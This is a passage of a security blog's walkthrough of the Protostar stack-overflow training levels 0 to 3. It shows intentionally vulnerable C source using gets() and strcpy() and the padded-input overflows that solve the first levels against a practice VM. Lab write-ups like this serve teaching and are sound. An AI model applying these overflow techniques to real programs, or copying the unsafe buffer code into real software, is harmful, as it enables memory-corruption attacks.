<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="pv-cache-enabled" content="false"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Exploit Exercise Protostar Stack Series" /><meta name="author" content="Noah Tongate" /><meta property="og:locale" content="en_US" /><meta name="description" content="Exploit Exercises Protostar Stack Series" /><meta property="og:description" content="Exploit Exercises Protostar Stack Series" /><link rel="canonical" href="https://ap3x.github.io/posts/exploit-education-protostar-stack-series/" /><meta property="og:url" content="https://ap3x.github.io/posts/exploit-education-protostar-stack-series/" /><meta property="og:site_name" content="Ap3x Security" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-12-14T10:49:32-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Exploit Exercise Protostar Stack Series" /><meta name="google-site-verification" content="hc0WsMROlLqBrjOZFEzVWbNtkroIFS0ATmWAsvSWHP8" /> <script type="application/ld+json"> {"headline":"Exploit Exercise Protostar Stack Series","dateModified":"2021-02-27T23:08:55-05:00","datePublished":"2020-12-14T10:49:32-05:00","description":"Exploit Exercises Protostar Stack Series","url":"https://ap3x.github.io/posts/exploit-education-protostar-stack-series/","mainEntityOfPage":{"@type":"WebPage","@id":"https://ap3x.github.io/posts/exploit-education-protostar-stack-series/"},"@type":"BlogPosting","author":{"@type":"Person","name":"Noah Tongate"},"@context":"https://schema.org"}</script><title>Exploit Exercise Protostar Stack Series | Ap3x Security</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-LSK4HZJM17"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-LSK4HZJM17'); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/profile/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Ap3x Security</a></div><div class="site-subtitle font-italic">Security Engineer, OSCP Certified, Wannabe Hacker, and Engineering Student</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/Ap3x" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['noah.tongate','gmail.com'].join('@')" aria-label="email" class="order-4" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/noahtongate" aria-label="linkedin" class="order-5" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Exploit Exercise Protostar Stack Series</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Exploit Exercise Protostar Stack Series</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Mon, Dec 14, 2020, 10:49 AM -0500" > Dec 14, 2020 <i class="unloaded">2020-12-14T10:49:32-05:00</i> </span> by <span class="author"> Noah Tongate </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sat, Feb 27, 2021, 11:08 PM -0500" > Feb 27 <i class="unloaded">2021-02-27T23:08:55-05:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="4229 words">23 min</span></div></div><div class="post-content"><h1 id="exploit-exercises-protostar-stack-series">Exploit Exercises Protostar Stack Series</h1><p>In this series I will solve each of the seven levels of in from exploit exercises protostar. You can find more info about the challenges <a href="https://exploit-exercises.lains.space/protostar/">here</a>. I will show you the source code and do my best to explain what is going on behind the scenes, my thought process, and how to solve and exploit each of the challenges. I tend to use <a href="https://github.com/longld/peda">GDB-Peda</a>, <a href="https://github.com/radareorg/radare2">Radare2</a>, or GDB.</p><h2 id="stack-zero">Stack Zero</h2><h3 id="source-code">Source Code</h3><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="cp">#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">volatile</span> <span class="kt">int</span> <span class="n">modified</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>

  <span class="n">modified</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>

  <span class="k">if</span><span class="p">(</span><span class="n">modified</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"you have changed the 'modified' variable</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"Try again?</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><h3 id="overview">Overview</h3><p><code class="language-plaintext highlighter-rouge">This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.</code> Viewing the source code we can that it is requiring the user to input some data with <code class="language-plaintext highlighter-rouge">gets()</code>. Which will then be saved to our <code class="language-plaintext highlighter-rouge">buffer</code> variable.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>ap3x@kali-exploitdev:~/Documents/ExploitExercise/Protostart<span class="nv">$ </span>./stack0 
<span class="nb">test
</span>Try again?
ap3x@kali-exploitdev:~/Documents/ExploitExercise/Protostart<span class="nv">$ </span>
</pre></table></code></div></div><p>We need to change the value of <code class="language-plaintext highlighter-rouge">modified</code> to step into the “if”.</p><h3 id="exploit">Exploit</h3><p>There is a char buffer that allocates 64 bytes. In the source code the <code class="language-plaintext highlighter-rouge">modified</code> variable is set to 0 then the line right after <code class="language-plaintext highlighter-rouge">gets()</code> is called where it requires the user to input some data. If we check out the manpage for this we can see that there is a bug:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>BUGS
       Never use gets<span class="o">()</span><span class="nb">.</span>  Because it is impossible to tell without knowing the data <span class="k">in </span>advance how many characters gets<span class="o">()</span>
       will <span class="nb">read</span>, and because gets<span class="o">()</span> will <span class="k">continue </span>to store characters past the end of the buffer, it is  extremely  dan‐
       gerous to use.  It has been used to <span class="nb">break </span>computer security.  Use fgets<span class="o">()</span> instead.

       For  more information, see CWE-242 <span class="o">(</span>aka <span class="s2">"Use of Inherently Dangerous Function"</span><span class="o">)</span> at http://cwe.mitre.org/data/defi‐
       nitions/242.html

</pre></table></code></div></div><p>The issue as stated in the bug is that the characters are stored within the <code class="language-plaintext highlighter-rouge">buffer</code> and the characters inputted can go over the allocated amount without any checks. Since the buffer variable is stored on the stack. Since the variable <code class="language-plaintext highlighter-rouge">monitored</code> is placed on the stack before the buffer array and knowing that the stack grows downward we can overwrite the monitored variable and change the value. We can test this with the help of some python.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python <span class="nt">-c</span> <span class="s2">"print 'A'*68"</span> | ./stack0
</pre></table></code></div></div><p>The output reveals that we have changed the variable</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>ap3x@kali-exploitdev:~/Documents/ExploitExercise/Protostart<span class="nv">$ </span>python <span class="nt">-c</span> <span class="s2">"print 'A'*65"</span> | ./stack0 
you have changed the <span class="s1">'modified'</span> variable
</pre></table></code></div></div><h2 id="stack-one">Stack One</h2><h3 id="source-code-1">Source Code</h3><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="cp">#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">volatile</span> <span class="kt">int</span> <span class="n">modified</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>

  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"please specify an argument</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="n">modified</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>

  <span class="k">if</span><span class="p">(</span><span class="n">modified</span> <span class="o">==</span> <span class="mh">0x61626364</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"you have correctly got the variable to the right value</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"Try again, you got 0x%08x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">modified</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>

</pre></table></code></div></div><h3 id="overview-1">Overview</h3><p><code class="language-plaintext highlighter-rouge">This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.</code></p><p>The first if statement checks if there is the correct number of arguments and if there is an argument passed then it is saved into <code class="language-plaintext highlighter-rouge">buffer</code>. This is very similar to Stack 0. The issue is mainly with <code class="language-plaintext highlighter-rouge">strcpy()</code></p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>ap3x@kali-exploitdev:~/Documents/ExploitExercise/Protostart<span class="nv">$ </span>./stack1 <span class="nb">test
</span>Try again, you got 0x00000000
</pre></table></code></div></div><h3 id="exploit-1">Exploit</h3><p>The issue with this piece of source code is the <code class="language-plaintext highlighter-rouge">strcpy()</code> and we can verify this by viewing the manpage for the <code class="language-plaintext highlighter-rouge">strcpy</code> as shown below</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>BUGS
       If the destination string of a strcpy<span class="o">()</span> is not large enough, <span class="k">then </span>anything might happen. Overflowing fixed-length string buffers is a favorite cracker technique <span class="k">for </span>taking <span class="nb">complete </span>control of the machine. Any <span class="nb">time </span>a program reads or copies data into a buffer, the program first needs to check that there<span class="s1">'s enough space. This may be un‐necessary if you can show that overflow is impossible, but be careful: programs can get changed over time, in ways that may make the impossible possible.
</span></pre></table></code></div></div><p>Since the <code class="language-plaintext highlighter-rouge">modified</code> variable is stored before the <code class="language-plaintext highlighter-rouge">buffer</code> variable and a <code class="language-plaintext highlighter-rouge">strcpy</code> is used to store a string of characters into the buffer without checking if it fits we can change the value of <code class="language-plaintext highlighter-rouge">modified</code>. So in this instance we want to change <code class="language-plaintext highlighter-rouge">modified</code> to match <code class="language-plaintext highlighter-rouge">0x61626364</code>. So we can convert the hex to see what the ascii equivalent is and use that to overwrite the variable value</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="o">&gt;&gt;&gt;</span> <span class="s">"61626364"</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">"hex"</span><span class="p">)</span>
<span class="s">'abcd'</span>
</pre></table></code></div></div><p>Now we can append <code class="language-plaintext highlighter-rouge">abcd</code> to the end of our 65 bytes of ‘A’ as seen below. But notice the bytes are arranged in big endian format.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>ap3x@kali-exploitdev:~/Documents/ExploitExercise/Protostart<span class="nv">$ </span>./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAabcd
Try again, you got 0x64636261
ap3x@kali-exploitdev:~/Documents/ExploitExercise/Protostart<span class="nv">$ </span>./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba
you have correctly got the variable to the right value
</pre></table></code></div></div><h2 id="stack-two">Stack Two</h2><h3 id="source-code-2">Source Code</h3><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="cp">#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">volatile</span> <span class="kt">int</span> <span class="n">modified</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">variable</span><span class="p">;</span>

  <span class="n">variable</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">"GREENIE"</span><span class="p">);</span>

  <span class="k">if</span><span class="p">(</span><span class="n">variable</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"please set the GREENIE environment variable</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="n">modified</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

  <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">variable</span><span class="p">);</span>

  <span class="k">if</span><span class="p">(</span><span class="n">modified</span> <span class="o">==</span> <span class="mh">0x0d0a0d0a</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"you have correctly modified the variable</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"Try again, you got 0x%08x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">modified</span><span class="p">);</span>
  <span class="p">}</span>

<span class="p">}</span>

</pre></table></code></div></div><h3 id="overview-2">Overview</h3><p><code class="language-plaintext highlighter-rouge">Stack2 looks at environment variables, and how they can be set.</code> After we try to execute the program we can see that we need to set the GREENIE environment variable</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>ap3x@kali-exploitdev:~/Documents/ExploitExercise/Protostart<span class="nv">$ </span>./stack2 
stack2: please <span class="nb">set </span>the GREENIE environment variable

ap3x@kali-exploitdev:~/Documents/ExploitExercise/Protostart<span class="nv">$ </span><span class="nb">export </span><span class="nv">GREENIE</span><span class="o">=</span><span class="nb">test
</span>ap3x@kali-exploitdev:~/Documents/ExploitExercise/Protostart<span class="nv">$ </span>./stack2 
Try again, you got 0x00000000
</pre></table></code></div></div><h3 id="exploit-2">Exploit</h3><p>In this program it is similar to the previous challeneg, but instead we are using a environment variable called <code class="language-plaintext highlighter-rouge">GREENIE</code>. So we have to set the variable with the <code class="language-plaintext highlighter-rouge">export</code> and set a new value. It looks like the value that the program is looking for is <code class="language-plaintext highlighter-rouge">0x0d0a0d0a</code>. So we can decode the hex to ascii and see that it uses the newline and return hex values.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="o">&gt;&gt;&gt;</span> <span class="s1">'0d0a0d0a'</span>.decode<span class="o">(</span><span class="s1">'hex'</span><span class="o">)</span>
<span class="s1">'\r\n\r\n'</span>
</pre></table></code></div></div><p>So if we try to append this to a 64 byte ‘A’ string then we get this:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>ap3x@kali-exploitdev:~/Documents/ExploitExercise/Protostart<span class="nv">$ </span><span class="nb">export </span><span class="nv">GREENIE</span><span class="o">=</span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<span class="se">\r\n\r\n</span>
ap3x@kali-exploitdev:~/Documents/ExploitExercise/Protostart<span class="nv">$ </span>./stack2 Try again, you got 0x6e726e72
</pre></table></code></div></div><p>The values are not correctly interpreted so we can use a little python to get the exact values we want.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>ap3x@kali-exploitdev:~/Documents/ExploitExercise/Protostart<span class="nv">$ </span><span class="nb">export </span><span class="nv">GREENIE</span><span class="o">=</span><span class="sb">`</span>python <span class="nt">-c</span> <span class="s2">"print 'A'*64 + '</span><span class="se">\x</span><span class="s2">0a</span><span class="se">\x</span><span class="s2">0d</span><span class="se">\x</span><span class="s2">0a</span><span class="se">\x</span><span class="s2">0d'"</span><span class="sb">`</span>
ap3x@kali-exploitdev:~/Documents/ExploitExercise/Protostart<span class="nv">$ </span>./stack2 
you have correctly modified the variable
</pre></table></code></div></div><h2 id="stack-three">Stack Three</h2><h3 id="source-code-3">Source Code</h3><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="cp">#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
</span>
<span class="kt">void</span> <span class="nf">win</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"code flow successfully changed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">volatile</span> <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">fp</span><span class="p">)();</span>
  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>

  <span class="n">fp</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>

  <span class="k">if</span><span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">printf</span><span class="p">(</span><span class="s">"calling function pointer, jumping to 0x%08x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
      <span class="n">fp</span><span class="p">();</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><h3 id="overview-3">Overview</h3><p><code class="language-plaintext highlighter-rouge">Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)</code></p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>ap3x@kali-exploitdev:~/Documents/ExploitExercise/Protostar<span class="nv">$ </span>./stack3
<span class="nb">test</span>
</pre></table></code></div></div><h3 id="exploit-3">Exploit</h3><p>This is very similar to the previous challenges, but instead the bug in the program is <code class="language-plaintext highlighter-rouge">gets()</code>. If we look at the manpage for <code class="language-plaintext highlighter-rouge">gets()</code> we can understand the bug a little better.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>BUGS
       Never use gets<span class="o">()</span><span class="nb">.</span> Because it is impossible to tell without knowing the data <span class="k">in </span>advance how many characters gets<span class="o">()</span> will <span class="nb">read</span>, and because gets<span class="o">()</span> will <span class="k">continue </span>to store  characters  past the end of the buffer, it is extremely dangerous to use.  It has been used to <span class="nb">break </span>computer security.  Use fgets<span class="o">()</span> instead.
